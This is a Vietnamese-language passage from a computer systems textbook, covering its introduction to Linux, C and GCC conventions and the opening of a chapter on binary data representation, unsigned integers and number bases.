<p><strong>Cách tận dụng sức mạnh của máy tính song song với lập trình song song</strong>: Tận dụng tính toán song song là điều quan trọng trong thế giới <code>multicore</code> ngày nay. Bạn sẽ học cách khai thác nhiều lõi trên <code>CPU</code> của mình để làm cho chương trình chạy nhanh hơn. Bạn sẽ biết những kiến thức cơ bản về phần cứng <code>multicore</code>, khái niệm trừu tượng <code>thread</code> (&quot;luồng&quot;) của <code>OS</code>, và các vấn đề liên quan đến việc thực thi chương trình song song đa luồng. Bạn sẽ có kinh nghiệm thiết kế chương trình song song và viết các chương trình song song đa luồng bằng thư viện luồng POSIX (<code>Pthreads</code>). Bạn cũng sẽ được giới thiệu về các loại hệ thống song song và mô hình lập trình song song khác.</p>
<p>Trong quá trình học, bạn cũng sẽ tìm hiểu nhiều chi tiết quan trọng khác về <code>computer systems</code>, bao gồm cách chúng được thiết kế và cách chúng hoạt động. Bạn sẽ học được những chủ đề quan trọng trong thiết kế hệ thống và các kỹ thuật để đánh giá hiệu suất của hệ thống và chương trình. Bạn cũng sẽ thành thạo các kỹ năng quan trọng, bao gồm lập trình và gỡ lỗi C và <code>assembly</code>.</p>
<h2 id="bắt-đầu-với-cuốn-sách-này"><a class="header" href="#bắt-đầu-với-cuốn-sách-này">Bắt đầu với cuốn sách này</a></h2>
<p>Một vài lưu ý về ngôn ngữ, ký hiệu trong sách, và các khuyến nghị để bắt đầu đọc cuốn sách này:</p>
<h3 id="linux-c-và-trình-biên-dịch-gnu"><a class="header" href="#linux-c-và-trình-biên-dịch-gnu">Linux, C, và Trình biên dịch GNU</a></h3>
<p>Chúng tôi sử dụng ngôn ngữ lập trình C trong các ví dụ xuyên suốt cuốn sách. C là một ngôn ngữ lập trình bậc cao như Java và Python, nhưng nó ít trừu tượng hóa khỏi <code>computer system</code> nền tảng hơn so với nhiều ngôn ngữ bậc cao khác. Do đó, C là ngôn ngữ được lựa chọn cho các lập trình viên muốn kiểm soát nhiều hơn cách chương trình của họ thực thi trên <code>computer system</code>.</p>
<p>Mã và các ví dụ trong cuốn sách này được biên dịch bằng Trình biên dịch C của GNU (<code>GCC</code>) và chạy trên <code>operating system</code> Linux. Mặc dù không phải là <code>OS</code> phổ thông phổ biến nhất, Linux là <code>OS</code> thống trị trên các hệ thống siêu máy tính và được cho là <code>OS</code> được các nhà khoa học máy tính sử dụng phổ biến nhất.</p>
<p>Linux cũng miễn phí và có mã nguồn mở, điều này góp phần vào việc sử dụng phổ biến của nó trong các môi trường này. Kiến thức làm việc với Linux là một tài sản quý giá cho tất cả sinh viên ngành máy tính. Tương tự, <code>GCC</code> được cho là trình biên dịch C phổ biến nhất hiện nay. Do đó, chúng tôi sử dụng Linux và <code>GCC</code> trong các ví dụ của mình. Tuy nhiên, các hệ thống và trình biên dịch Unix khác cũng có các giao diện và chức năng tương tự.</p>
<p>Trong cuốn sách này, chúng tôi khuyến khích bạn gõ theo các ví dụ được liệt kê. Các lệnh Linux xuất hiện trong các khối như sau:</p>
<pre><code>$
</code></pre>
<p>Dấu <code>$</code> đại diện cho dấu nhắc lệnh (command prompt). Nếu bạn thấy một hộp trông như thế này:</p>
<pre><code>$ uname -a
</code></pre>
<p>đây là dấu hiệu để bạn gõ <code>uname -a</code> trên dòng lệnh. Hãy chắc chắn rằng bạn không gõ dấu <code>$</code>!</p>
<p>Đầu ra của một lệnh thường được hiển thị ngay sau lệnh đó trong danh sách dòng lệnh. Ví dụ, hãy thử gõ <code>uname -a</code>. Đầu ra của lệnh này thay đổi tùy theo hệ thống. Đầu ra mẫu cho một hệ thống 64-bit được hiển thị ở đây.</p>
<pre><code>$ uname -a
Linux Fawkes 4.4.0-171-generic #200-Ubuntu SMP Tue Dec 3 11:04:55 UTC 2019
x86_64 x86_64 x86_64 GNU/Linux
</code></pre>
<p>Lệnh <code>uname</code> in ra thông tin về một hệ thống cụ thể. Cờ <code>-a</code> in ra tất cả thông tin liên quan đến hệ thống theo thứ tự sau:</p>
<ul>
<li>Tên kernel của hệ thống (trong trường hợp này là Linux)</li>
<li>Tên máy chủ (hostname) của máy (ví dụ: Fawkes)</li>
<li>Phiên bản kernel (ví dụ: 4.4.0-171-generic)</li>
<li>Bản dựng kernel (ví dụ: #200-Ubuntu SMP Tue Dec 3 11:04:55 UTC 2019)</li>
<li>Phần cứng máy (ví dụ: x86_64)</li>
<li>Loại bộ xử lý (ví dụ: x86_64)</li>
<li>Nền tảng phần cứng (ví dụ: x86_64)</li>
<li>Tên <code>operating system</code> (ví dụ: GNU/Linux)</li>
</ul>
<p>Bạn có thể tìm hiểu thêm về lệnh <code>uname</code> hoặc bất kỳ lệnh Linux nào khác bằng cách đặt <code>man</code> trước lệnh đó, như được hiển thị ở đây:</p>
<pre><code>$ man uname
</code></pre>
<p>Lệnh này sẽ hiển thị trang hướng dẫn (manual page) liên quan đến lệnh <code>uname</code>. Để thoát khỏi giao diện này, hãy nhấn phím <code>q</code>.</p>
<p>Mặc dù việc trình bày chi tiết về Linux nằm ngoài phạm vi của cuốn sách này, độc giả có thể có một phần giới thiệu tốt trong <a href="Appendix2/index.html">Phụ lục 2 - Sử dụng UNIX</a> trực tuyến. Cũng có một số tài nguyên trực tuyến có thể cung cấp cho độc giả một cái nhìn tổng quan tốt. Một gợi ý là &quot;The Linux Command Line&quot;^1^.</p>
<h3 id="các-loại-ký-hiệu-và-chú-thích-khác"><a class="header" href="#các-loại-ký-hiệu-và-chú-thích-khác">Các loại Ký hiệu và Chú thích khác</a></h3>
<p>Ngoài các đoạn code và dòng lệnh, chúng tôi sử dụng một số loại &quot;chú thích&quot; khác để trình bày nội dung trong cuốn sách này.</p>
<p>Loại đầu tiên là <strong>chuyện bên lề</strong>. Các câu chuyện bên lề nhằm cung cấp thêm bối cảnh cho văn bản, thường là về lịch sử. Đây là một ví dụ:</p>
<blockquote>
<blockquote>
<p><strong>Nguồn gốc của Linux, GNU, và phong trào Phần mềm Nguồn mở Miễn phí (FOSS)</strong></p>
</blockquote>
<p>Năm 1969, AT&amp;T Bell Labs đã phát triển <code>operating system</code> UNIX để sử dụng nội bộ. Mặc dù ban đầu nó được viết bằng <code>assembly</code>, nó đã được viết lại bằng C vào năm 1973. Do một vụ kiện chống độc quyền cấm AT&amp;T Bell Labs tham gia vào ngành công nghiệp máy tính, AT&amp;T Bell Labs đã cấp phép miễn phí <code>operating system</code> UNIX cho các trường đại học, dẫn đến việc nó được áp dụng rộng rãi. Tuy nhiên, đến năm 1984, AT&amp;T tách khỏi Bell Labs, và (giờ đã thoát khỏi những ràng buộc trước đó) bắt đầu bán UNIX như một sản phẩm thương mại, trước sự tức giận và thất vọng của nhiều cá nhân trong giới học thuật.</p>
<p>Để phản ứng trực tiếp, Richard Stallman (khi đó là sinh viên tại MIT) đã phát triển Dự án GNU (&quot;GNU is not UNIX&quot; - GNU không phải là UNIX) vào năm 1984, với mục tiêu tạo ra một hệ thống giống UNIX hoàn toàn bằng phần mềm miễn phí. Dự án GNU đã tạo ra một số sản phẩm phần mềm miễn phí thành công, bao gồm Trình biên dịch C của GNU (<code>GCC</code>), GNU Emacs (một môi trường phát triển phổ biến), và Giấy phép Công cộng GNU (GPL, nguồn gốc của nguyên tắc &quot;copyleft&quot;).</p>
<p>Năm 1992, Linus Torvalds, khi đó là sinh viên tại Đại học Helsinki, đã phát hành một <code>operating system</code> giống UNIX mà ông viết dưới giấy phép GPL. <code>Operating system</code> Linux (phát âm là &quot;Lin-nux&quot; hoặc &quot;Lee-nux&quot; vì tên của Linus Torvald được phát âm là &quot;Lee-nus&quot;) được phát triển bằng các công cụ GNU. Ngày nay, các công cụ GNU thường được đóng gói cùng với các bản phân phối Linux. Linh vật của <code>operating system</code> Linux là Tux, một chú chim cánh cụt. Torvalds dường như đã bị một con chim cánh cụt cắn khi đến thăm sở thú, và đã chọn chim cánh cụt làm linh vật cho <code>operating system</code> của mình sau khi nảy sinh tình cảm với loài sinh vật này, điều mà ông gọi là mắc phải &quot;bệnh viêm cánh cụt&quot; (penguinitis).</p>
</blockquote>
<p>Loại chú thích thứ hai chúng tôi sử dụng trong văn bản này là <strong>lưu ý</strong>. Các lưu ý được sử dụng để làm nổi bật thông tin quan trọng, chẳng hạn như việc sử dụng một số loại ký hiệu nhất định hoặc gợi ý về cách tiếp thu thông tin nào đó. Một lưu ý mẫu được hiển thị bên dưới:</p>
<blockquote>
<p><strong>Lưu ý: Cách đọc tài liệu trong cuốn sách này</strong></p>
<p>Với tư cách là một sinh viên, việc đọc tài liệu trong sách giáo khoa là rất quan trọng. Lưu ý rằng chúng tôi nói &quot;thực hành&quot; việc đọc, chứ không chỉ đơn giản là &quot;đọc&quot; tài liệu. &quot;Đọc&quot; một văn bản thường ngụ ý việc tiếp thu một cách thụ động các từ ngữ trên trang giấy. Chúng tôi khuyến khích sinh viên áp dụng một cách tiếp cận chủ động hơn. Nếu bạn thấy một ví dụ về code, hãy thử gõ nó vào! Sẽ không sao nếu bạn gõ sai hoặc gặp lỗi; đó là cách tốt nhất để học! Trong ngành máy tính, lỗi không phải là thất bại — chúng đơn giản là kinh nghiệm.</p>
</blockquote>
<p>Loại chú thích cuối cùng mà sinh viên nên đặc biệt chú ý là <strong>cảnh báo</strong>. Các tác giả sử dụng cảnh báo để làm nổi bật những điều là &quot;cú lừa&quot; phổ biến hoặc nguyên nhân gây bực bội thường gặp trong số các sinh viên của chúng tôi. Mặc dù không phải tất cả các cảnh báo đều có giá trị như nhau đối với tất cả sinh viên, chúng tôi khuyên bạn nên xem lại các cảnh báo để tránh những cạm bẫy phổ biến bất cứ khi nào có thể. Một cảnh báo mẫu được hiển thị ở đây:</p>
<blockquote>
<p><strong>Cảnh báo: Cuốn sách này có chứa những câu nói đùa</strong></p>
<p>Các tác giả (đặc biệt là tác giả đầu tiên) rất thích những câu nói đùa và các bản nhạc chế liên quan đến máy tính (và không nhất thiết phải là những câu đùa hay). Các phản ứng bất lợi đối với khiếu hài hước của các tác giả có thể bao gồm (nhưng không giới hạn ở) đảo mắt, thở dài bực bội, và vỗ trán.</p>
</blockquote>
<p>Nếu bạn đã sẵn sàng bắt đầu, vui lòng tiếp tục với chương đầu tiên khi chúng ta lặn vào thế giới tuyệt vời của C. Nếu bạn đã biết một chút về lập trình C, bạn có thể muốn bắt đầu với Chương 4 về biểu diễn <code>binary</code>, hoặc tiếp tục với lập trình C nâng cao hơn trong Chương 2.</p>
<p>Chúng tôi hy vọng bạn sẽ tận hưởng cuộc hành trình này cùng chúng tôi!</p>
<h2 id="tài-liệu-tham-khảo"><a class="header" href="#tài-liệu-tham-khảo">Tài liệu tham khảo</a></h2>
<ol>
<li>William Shotts. &quot;The Linux Command Line&quot;, LinuxCommand.org, <a href="https://linuxcommand.org/">https://linuxcommand.org/</a></li>
</ol>
<div style="break-before: page; page-break-before: always;"></div><h2 id="4-biểu-diễn-dữ-liệu-và-hệ-nhị-phân-binary-and-data-representation"><a class="header" href="#4-biểu-diễn-dữ-liệu-và-hệ-nhị-phân-binary-and-data-representation">4. Biểu diễn dữ liệu và hệ nhị phân (Binary and Data Representation)</a></h2>
<p>Từ những tấm bảng đá và tranh vẽ trong hang động, đến chữ viết và rãnh ghi âm trên đĩa than, con người luôn tìm cách ghi lại và lưu trữ thông tin.<br />
Trong chương này, chúng ta sẽ tìm hiểu cách mà một trong những bước đột phá lớn nhất của nhân loại trong lưu trữ — <strong>máy tính số</strong> — biểu diễn thông tin.<br />
Chúng ta cũng sẽ minh họa cách diễn giải ý nghĩa từ dữ liệu số.</p>
<p>Các máy tính hiện đại sử dụng nhiều loại phương tiện để lưu trữ thông tin (ví dụ: đĩa từ, đĩa quang, bộ nhớ flash, băng từ, và các mạch điện tử đơn giản).<br />
Chúng ta sẽ phân loại các thiết bị lưu trữ này ở <a href="C4-Binary/../C11-MemHierarchy/devices.html#_storage_devices">Chương 11</a>.<br />
Tuy nhiên, trong phạm vi thảo luận này, bản chất của phương tiện lưu trữ không quá quan trọng — dù là tia laser quét bề mặt DVD hay đầu đọc di chuyển trên đĩa từ, thì đầu ra cuối cùng từ thiết bị lưu trữ vẫn là một chuỗi tín hiệu điện.<br />
Để đơn giản hóa mạch điện, mỗi tín hiệu là <strong>binary</strong> (nhị phân), nghĩa là chỉ có thể ở một trong hai trạng thái: không có điện áp (diễn giải là 0) hoặc có điện áp (diễn giải là 1).<br />
Chương này sẽ khám phá cách hệ thống code hóa thông tin thành nhị phân, bất kể phương tiện lưu trữ ban đầu là gì.</p>
<p>Trong hệ nhị phân, mỗi tín hiệu tương ứng với một <strong>bit</strong> (binary digit — chữ số nhị phân) thông tin: 0 hoặc 1.<br />
Có thể bạn sẽ ngạc nhiên khi biết rằng mọi loại dữ liệu đều có thể được biểu diễn chỉ bằng 0 và 1.<br />
Tất nhiên, khi thông tin phức tạp hơn, số lượng bit cần thiết để biểu diễn nó cũng tăng lên.<br />
May mắn là, số lượng giá trị duy nhất có thể biểu diễn sẽ <strong>gấp đôi</strong> mỗi khi thêm một bit vào chuỗi bit, nên một chuỗi <em>N</em> bit có thể biểu diễn (2^N) giá trị khác nhau.</p>
<p>Hình 1 minh họa sự tăng trưởng số lượng giá trị có thể biểu diễn khi độ dài chuỗi bit tăng lên.<br />
Một bit có thể biểu diễn <strong>2</strong> giá trị: 0 và 1.<br />
Hai bit có thể biểu diễn <strong>4</strong> giá trị: cả hai giá trị 1-bit với số 0 ở đầu (00 và 01), và cả hai giá trị 1-bit với số 1 ở đầu (10 và 11).<br />
Mẫu này tiếp tục cho mỗi bit mới được thêm vào: bit mới có thể là 0 hoặc 1, và các bit còn lại vẫn biểu diễn cùng phạm vi giá trị như trước.<br />
Do đó, việc thêm bit làm tăng <strong>theo cấp số nhân</strong> số lượng giá trị mà chuỗi mới có thể biểu diễn.</p>
<p><img src="C4-Binary/_images/NumberOfBitsValues.png" alt="Với 1 bit, ta có thể biểu diễn 2 giá trị. 2 bit cho 4 giá trị, 3 bit cho 8 giá trị, và 4 bit cho 16 giá trị. Nói chung, ta có thể biểu diễn (2^N) giá trị với N bit." /></p>
<p><strong>Hình 1.</strong> Các giá trị có thể biểu diễn với từ 1 đến 4 bit. Các bit được gạch chân thể hiện phần tiền tố được kế thừa từ hàng phía trên.</p>
<p>Vì một bit đơn lẻ không chứa được nhiều thông tin, các hệ thống lưu trữ thường nhóm nhiều bit lại thành chuỗi dài hơn để lưu trữ giá trị phức tạp hơn.<br />
Nhóm phổ biến nhất là <strong>byte</strong>, gồm 8 bit.<br />
Một byte có thể biểu diễn (2^8 = 256) giá trị khác nhau (0–255) — đủ để code hóa các chữ cái và ký hiệu thông dụng trong tiếng Anh.<br />
Byte cũng là đơn vị nhỏ nhất có thể định địa chỉ trong bộ nhớ máy tính, nghĩa là chương trình không thể yêu cầu ít hơn 8 bit để lưu một biến.</p>
<p>Các CPU hiện đại cũng thường định nghĩa <strong>word</strong> là 32 bit hoặc 64 bit, tùy thiết kế phần cứng.<br />
Kích thước của word xác định kích thước “mặc định” mà phần cứng sử dụng để truyền dữ liệu giữa các thành phần (ví dụ: giữa bộ nhớ và thanh ghi).<br />
Những chuỗi bit dài hơn này cần thiết để lưu trữ các số lớn, vì chương trình thường cần đếm vượt quá 256.</p>
<p>Nếu bạn đã lập trình C, bạn sẽ biết rằng mình phải <a href="C4-Binary/../C1-C_intro/getting_started.html#_variables_and_c_numeric_types">khai báo biến trước khi sử dụng</a>.<br />
Khai báo này cho trình biên dịch C biết hai thông tin quan trọng về cách biểu diễn nhị phân của biến:</p>
<ol>
<li>Số lượng bit cần cấp phát.</li>
<li>Cách chương trình sẽ <strong>diễn giải</strong> các bit đó.</li>
</ol>
<p>Về mặt số lượng bit, trình biên dịch chỉ cần tra <a href="C4-Binary/../C1-C_intro/getting_started.html#_c_numeric_types">kích thước kiểu dữ liệu</a> (ví dụ: <code>char</code> là 1 byte) và cấp phát đúng lượng bộ nhớ.<br />
Nhưng cách <strong>diễn giải</strong> chuỗi bit mới là phần thú vị hơn.<br />
Mọi dữ liệu trong bộ nhớ máy tính đều được lưu dưới dạng bit, nhưng bit <strong>không có ý nghĩa cố hữu</strong>.<br />
Ví dụ, ngay cả với một bit duy nhất, bạn có thể diễn giải hai giá trị của nó theo nhiều cách: lên/xuống, đen/trắng, có/không, bật/tắt, v.v.</p>
<p>Khi tăng độ dài chuỗi bit, phạm vi diễn giải cũng mở rộng.<br />
Ví dụ, biến <code>char</code> sử dụng tiêu chuẩn code hóa <strong>ASCII</strong> (American Standard Code for Information Interchange), định nghĩa cách giá trị nhị phân 8 bit tương ứng với chữ cái và ký hiệu tiếng Anh.<br />
Bảng 1 cho thấy một phần nhỏ của bảng ASCII (để xem đầy đủ, bạn có thể chạy <code>man ascii</code> trên dòng lệnh).<br />
Không có lý do đặc biệt nào để ký tự <code>'X'</code> phải tương ứng với <code>01011000</code>, nên bạn không cần ghi nhớ bảng này.<br />
Điều quan trọng là mọi chương trình lưu trữ chữ cái đều thống nhất cách diễn giải chuỗi bit, và đó là lý do ASCII được định nghĩa bởi một ủy ban tiêu chuẩn.</p>
<div class="table-wrapper"><table><thead><tr><th>Giá trị nhị phân</th><th>Ký tự</th><th>Giá trị nhị phân</th><th>Ký tự</th></tr></thead><tbody>
<tr><td>01010111</td><td>W</td><td>00100000</td><td>space</td></tr>
<tr><td>01011000</td><td>X</td><td>00100001</td><td>!</td></tr>
<tr><td>01011001</td><td>Y</td><td>00100010</td><td>&quot;</td></tr>
<tr><td>01011010</td><td>Z</td><td>00100011</td><td>#</td></tr>
</tbody></table>
</div>
<p><strong>Bảng 1.</strong> Một phần nhỏ của bảng code ASCII 8 bit.</p>
<p>Bất kỳ loại thông tin nào cũng có thể được code hóa thành nhị phân, kể cả dữ liệu phức tạp như hình ảnh và âm thanh.<br />
Ví dụ, giả sử một hệ code hóa ảnh định nghĩa:<br />
<code>00</code> = trắng, <code>01</code> = cam, <code>10</code> = xanh dương, <code>11</code> = đen.<br />
Hình 2 minh họa cách ta có thể dùng code hóa 2 bit này để vẽ một hình con cá đơn giản chỉ với 12 byte.<br />
Ở phần (a), mỗi ô ảnh tương ứng với một chuỗi 2 bit.<br />
Phần (b) và (c) cho thấy cách code hóa nhị phân này dưới dạng chuỗi 2 bit và chuỗi byte.</p>
<p><img src="C4-Binary/_images/ImageRepresentation.png" alt="Hình con cá với nền xanh dương (10), mắt trắng (00), đồng tử đen (11), và thân màu cam (01)." /></p>
<p><strong>Hình 2.</strong> (a) Biểu diễn hình ảnh, (b) biểu diễn theo ô 2 bit, và (c) biểu diễn theo byte của hình con cá đơn giản.</p>
<p>Vừa giới thiệu hai cách code hóa, ta thấy cùng một chuỗi bit <code>01011010</code> có thể được trình soạn thảo văn bản hiểu là ký tự <code>'Z'</code>, nhưng một chương trình đồ họa lại hiểu là một phần đuôi cá.<br />
Cách diễn giải nào đúng phụ thuộc vào <strong>ngữ cảnh</strong>.<br />
Mặc dù các bit bên dưới là giống nhau, con người thường thấy một số cách diễn giải dễ hiểu hơn (ví dụ: nhìn thấy hình con cá với màu sắc thay vì bảng byte).</p>
<p>Phần còn lại của chương này sẽ tập trung vào việc biểu diễn và thao tác với <strong>số nhị phân</strong>, nhưng điều quan trọng cần nhớ là:<br />
Mọi thông tin trong bộ nhớ máy tính đều được lưu dưới dạng 0 và 1, và việc diễn giải nghĩa đống bits đó hoàn toàn phụ thuộc vào chương trình, cũng như những người đang vận hành nó.</p>
<div style="break-before: page; page-break-before: always;"></div><h2 id="41-các-hệ-cơ-số-và-số-nguyên-không-dấu-unsigned-integers"><a class="header" href="#41-các-hệ-cơ-số-và-số-nguyên-không-dấu-unsigned-integers">4.1. Các hệ cơ số và số nguyên không dấu (unsigned integers)</a></h2>
<p>Sau khi đã thấy rằng <a href="C4-Binary/index.html#_binary_and_data_representation">các dãy nhị phân (binary sequences) có thể được diễn giải theo nhiều cách phi số học khác nhau</a>, giờ chúng ta hãy chuyển sự chú ý sang các con số. Cụ thể, chúng ta sẽ bắt đầu với <strong>unsigned</strong> numbers (số nguyên không dấu), tức là các số có thể được diễn giải là bằng 0 hoặc dương, nhưng không bao giờ âm (chúng không có <em>sign</em> — dấu).</p>
<h3 id="411-số-thập-phân-decimal-numbers"><a class="header" href="#411-số-thập-phân-decimal-numbers">4.1.1. Số thập phân (decimal numbers)</a></h3>
<p>Thay vì bắt đầu với nhị phân, trước hết hãy xem xét một hệ thống số mà chúng ta đã quen thuộc: <strong>decimal number system</strong> (hệ số thập phân), sử dụng <em>base</em> (cơ số) là 10. <em>Base 10</em> (cơ số 10) ngụ ý hai đặc điểm quan trọng trong việc diễn giải và biểu diễn các giá trị thập phân:</p>
<ol>
<li>
<p>Mỗi chữ số riêng lẻ trong một số ở cơ số 10 lưu trữ một trong 10 giá trị duy nhất (0–9). Để lưu trữ một giá trị lớn hơn 9, giá trị đó phải được <strong>carry</strong> (nhớ sang) một chữ số bổ sung ở bên trái. Ví dụ, nếu một chữ số đang ở giá trị tối đa (9) và ta cộng thêm 1, kết quả sẽ cần hai chữ số (9 + 1 = 10). Mẫu này đúng cho mọi chữ số, bất kể vị trí của nó trong số (ví dụ: 50 <strong>8</strong> 0 + <strong>2</strong> 0 = 5 <strong>10</strong> 0).</p>
</li>
<li>
<p>Vị trí của mỗi chữ số trong số quyết định tầm quan trọng của chữ số đó đối với giá trị tổng thể. Đánh số các chữ số từ <em>phải sang trái</em> là d0, d1, d2, v.v., mỗi chữ số kế tiếp sẽ đóng góp một hệ số gấp <em>mười</em> lần so với chữ số liền kề bên phải. Ví dụ, xét giá trị 8425 (<a href="C4-Binary/bases.html#FigBaseTen">Hình 1</a>).</p>
</li>
</ol>
<p><img src="C4-Binary/_images/BaseTen.png" alt="For the number 8425, digit 0 is the 5, which is in the &quot;ones place&quot;.  Digit 1 is the 2, which is in the &quot;tens place&quot;.  Digit 2 is the 4, in the &quot;hundreds place&quot;.  Finally, digit 3 is the 8, in the &quot;thousands place&quot;." /></p>
<p><strong>Hình 1.</strong> Tầm quan trọng của mỗi chữ số trong một số ở cơ số 10, sử dụng các tên gọi mà bạn có thể đã học ở tiểu học.</p>
<p>Với ví dụ 8425: số 5 ở vị trí &quot;ones&quot; (hàng đơn vị) đóng góp 5 (5 × 10⁰). Số 2 ở vị trí &quot;tens&quot; (hàng chục) đóng góp 20 (2 × 10¹). Số 4 ở vị trí &quot;hundreds&quot; (hàng trăm) đóng góp 400 (4 × 10²). Cuối cùng, số 8 ở vị trí &quot;thousands&quot; (hàng nghìn) đóng góp 8000 (8 × 10³). Một cách chính xác hơn, ta có thể biểu diễn 8425 như sau:</p>
<p>(8 × 10³)    +    (4 × 10²)    +    (2 × 10¹)    +    (5 × 10⁰)</p>
<p>Mẫu số mũ tăng dần áp dụng cho cơ số 10 này chính là lý do tại sao nó được gọi là <em>base 10</em> (cơ số 10). Việc đánh số vị trí các chữ số từ phải sang trái bắt đầu với d0 ngụ ý rằng mỗi chữ số di đóng góp 10ⁱ vào giá trị tổng thể. Do đó, giá trị tổng thể của bất kỳ số thập phân N chữ số nào có thể được biểu diễn như:</p>
<p>(dN-1 × 10ᴺ⁻¹)    +    (dN-2 × 10ᴺ⁻²)    +    …    +    (d2 × 10²)    +    (d1 × 10¹)    +    (d0 × 10⁰)</p>
<p>May mắn thay, như chúng ta sẽ thấy ngay sau đây, một mẫu tương tự cũng áp dụng cho các hệ cơ số khác.</p>
<p><strong>Phân biệt các hệ cơ số</strong></p>
<p>Bây giờ, khi chúng ta sắp giới thiệu một hệ cơ số thứ hai, một vấn đề tiềm ẩn là sự thiếu rõ ràng trong cách diễn giải một con số. Ví dụ, xét giá trị 1000. Không rõ ngay lập tức liệu bạn nên hiểu nó là giá trị thập phân (tức là một nghìn) hay giá trị nhị phân (tức là tám, lý do sẽ được giải thích ngay).<br />
Để làm rõ, phần còn lại của chương này sẽ gắn một <strong>prefix</strong> (tiền tố) cho tất cả các số không phải thập phân. Chúng ta sẽ sớm giới thiệu nhị phân, với tiền tố <strong>0b</strong>, và hệ thập lục phân (hexadecimal), với tiền tố <strong>0x</strong>.</p>
<p>Vì vậy, nếu bạn thấy 1000, hãy giả định đó là số thập phân &quot;một nghìn&quot;. Nếu bạn thấy 0b1000, hãy hiểu đó là số nhị phân, trong trường hợp này có giá trị là &quot;tám&quot;.</p>
<h3 id="412-số-nhị-phân-không-dấu-unsigned-binary-numbers"><a class="header" href="#412-số-nhị-phân-không-dấu-unsigned-binary-numbers">4.1.2. Số nhị phân không dấu (unsigned binary numbers)</a></h3>
<p>Mặc dù bạn có thể chưa từng nghĩ đến công thức cụ thể mô tả số thập phân dưới dạng lũy thừa của 10, nhưng khái niệm về các vị trí { <em>ones</em>, <em>tens</em>, <em>hundreds</em>, … } hẳn là quen thuộc. May mắn thay, thuật ngữ tương tự cũng áp dụng cho các hệ cơ số khác, như nhị phân. Tất nhiên, cơ số trong các hệ khác nhau sẽ khác nhau, nên mỗi vị trí chữ số sẽ đóng góp một giá trị khác nhau vào tổng số.</p>
<p><strong>Binary number system</strong> (hệ số nhị phân) sử dụng cơ số 2 thay vì 10 như hệ thập phân. Phân tích nó theo cách tương tự như với thập phân sẽ cho thấy nhiều điểm song song (với 2 thay cho 10):</p>
<ol>
<li>
<p>Mỗi <strong>bit</strong> trong một số ở cơ số 2 lưu trữ một trong hai giá trị duy nhất (0 hoặc 1). Để lưu trữ một giá trị lớn hơn 1, biểu diễn nhị phân phải <strong>carry</strong> sang một bit bổ sung ở bên trái. Ví dụ, nếu một bit đang ở giá trị tối đa (1) và ta cộng thêm 1, kết quả sẽ cần hai bit (1 + 1 = 0b10). Mẫu này đúng cho mọi bit, bất kể vị trí của nó trong số (ví dụ: 0b100 <strong>1</strong> 00 + 0b <strong>1</strong> 00 = 0b10 <strong>10</strong> 00).</p>
</li>
<li>
<p>Vị trí của mỗi bit trong số quyết định tầm quan trọng của bit đó đối với giá trị số. Đánh số các bit từ <em>phải sang trái</em> là d0, d1, d2, v.v., mỗi bit kế tiếp sẽ đóng góp một hệ số gấp <em>hai</em> lần so với bit liền kề bên phải.</p>
</li>
</ol>
<p>Điểm thứ nhất cho thấy việc đếm trong nhị phân tuân theo cùng một mẫu như thập phân: chỉ cần liệt kê các giá trị và thêm chữ số (bit) khi cần. Vì phần này tập trung vào <em>unsigned</em> numbers (chỉ gồm 0 và các số dương), nên việc bắt đầu đếm từ 0 là tự nhiên. <a href="C4-Binary/bases.html#TabBinaryCounting">Bảng 1</a> cho thấy cách đếm một vài số tự nhiên đầu tiên trong nhị phân. Như bạn có thể thấy từ bảng, việc đếm trong nhị phân nhanh chóng làm tăng số lượng chữ số. Điều này là hợp lý, vì mỗi chữ số nhị phân (chỉ có hai giá trị khả dĩ) chứa ít thông tin hơn một chữ số thập phân (10 giá trị khả dĩ).</p>
<div class="table-wrapper"><table><thead><tr><th><strong>Binary value</strong> (giá trị nhị phân)</th><th><strong>Decimal value</strong> (giá trị thập phân)</th></tr></thead><tbody>
<tr><td>0</td><td>0</td></tr>
<tr><td>1</td><td>1</td></tr>
<tr><td>10</td><td>2</td></tr>
<tr><td>11</td><td>3</td></tr>
<tr><td>100</td><td>4</td></tr>
<tr><td>101</td><td>5</td></tr>
<tr><td>...</td><td>...</td></tr>
</tbody></table>
</div>
<p><strong>Bảng 1.</strong> So sánh cách đếm trong hệ nhị phân và hệ thập phân.</p>
<p>Điểm thứ hai về việc đánh số vị trí các chữ số nghe thật quen thuộc! Thực tế, nó giống với hệ thập phân đến mức dẫn đến một công thức gần như y hệt để diễn giải một số nhị phân. Chỉ cần thay số 10 ở cơ số của mỗi số mũ bằng số 2:</p>
<p>$$(d_{N-1} \times 2^{N-1}) + (d_{N-2} \times 2^{N-2}) + \dots + (d_2 \times 2^2) + (d_1 \times 2^1) + (d_0 \times 2^0)$$</p>
<p>Áp dụng công thức này sẽ cho ra cách diễn giải <em>unsigned</em> (không dấu) của bất kỳ số nhị phân nào. Ví dụ, xét số <strong>0b1000</strong>:</p>
<p>$$(1 \times 2^3) + (0 \times 2^2) + (0 \times 2^1) + (0 \times 2^0)$$<br />
$$= 8 + 0 + 0 + 0 = 8$$</p>
<p>Một ví dụ dài hơn với một byte, <strong>0b10110100</strong>:</p>
<p>$$(1 \times 2^7) + (0 \times 2^6) + (1 \times 2^5) + (1 \times 2^4) + (0 \times 2^3) + (1 \times 2^2) + (0 \times 2^1) + (0 \times 2^0)$$<br />
$$= 128 + 0 + 32 + 16 + 0 + 4 + 0 + 0 = 180$$</p>
<h3 id="413-hệ-thập-lục-phân-hexadecimal"><a class="header" href="#413-hệ-thập-lục-phân-hexadecimal">4.1.3. Hệ thập lục phân (hexadecimal)</a></h3>
<p>Cho đến giờ, chúng ta đã xem xét hai hệ cơ số: thập phân (decimal) và nhị phân (binary). Hệ thập phân nổi bật vì con người quen sử dụng, trong khi hệ nhị phân phù hợp với cách dữ liệu được lưu trữ trong phần cứng. Điều quan trọng cần lưu ý là chúng <strong>tương đương</strong> về khả năng biểu diễn: không có số nào mà một hệ có thể biểu diễn còn hệ kia thì không. Với sự tương đương này, có thể bạn sẽ ngạc nhiên khi chúng ta tiếp tục tìm hiểu thêm một hệ cơ số nữa: <strong>hexadecimal</strong> (hệ thập lục phân) với cơ số 16.</p>
